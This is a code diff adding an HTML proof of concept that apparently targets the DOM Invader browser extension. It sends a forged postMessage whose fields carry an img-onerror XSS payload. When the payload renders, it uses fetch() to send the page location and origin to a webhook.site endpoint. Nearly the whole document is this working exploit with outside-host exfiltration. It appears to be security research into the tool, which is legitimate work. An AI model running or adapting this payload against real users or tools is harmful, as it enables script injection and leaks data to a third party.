@@ -1,23 +1,52 @@
-<script>
-const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DOM Invader Clean PoC</title>
+</head>
+<body style="background:#111;color:#0f0;text-align:center;padding-top:100px;font-family:sans-serif;">
+    
+    <h1>[ DOM Invader - Clean Test ]</h1>
+    <p>No DOM injection. Only postMessage.</p>
 
-function checkAndRun() {
-    const val = document.getElementById('secret').value;
-    if (val !== 'run') return;
+    <button onclick="trigger()" style="padding:15px 30px;font-size:18px;">
+        SEND MESSAGE
+    </button>
 
-    document.getElementById('status').innerText =
-        "Payload sent. Now check DOM Invader.";
+    <p id="status" style="margin-top:20px;color:#888;">Waiting...</p>
 
-    const payload = "TEST_PAYLOAD_" + Math.random();
+    <script>
+        const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
 
-    window.postMessage({
-        source: "dom-invader",
-        type: "augmented-dom",
-        data: {
-            sink: "innerHTML",
-            value: payload,
-            stackTrace: "at attacker (http://evil.com)"
+        function trigger() {
+
+            document.getElementById('status').innerText =
+                "Message sent. Check DOM Invader.";
+
+            const payload = (field) => `
+'); <img src=x onerror="
+fetch('${webhook}?field=${field}&loc=' + encodeURIComponent(window.location.href) + '&origin=' + encodeURIComponent(window.origin), {mode:'no-cors'});
+
+alert(
+'Execution Detected\\n\\n' +
+'Field: ${field}\\n' +
+'Location: ' + window.location.href + '\\n' +
+'Origin: ' + window.origin
+);
+"> //`;
+
+            window.postMessage({
+                source: "dom-invader",
+                type: "augmented-dom",
+                data: {
+                    sink: "innerHTML",
+                    value: payload("VALUE"),
+                    stackTrace: payload("STACK_TRACE")
+                }
+            }, "*");
+
+            console.log("postMessage sent. No local execution.");
         }
-    }, "*");
-}
-</script>
+    </script>
+
+</body>
+</html>
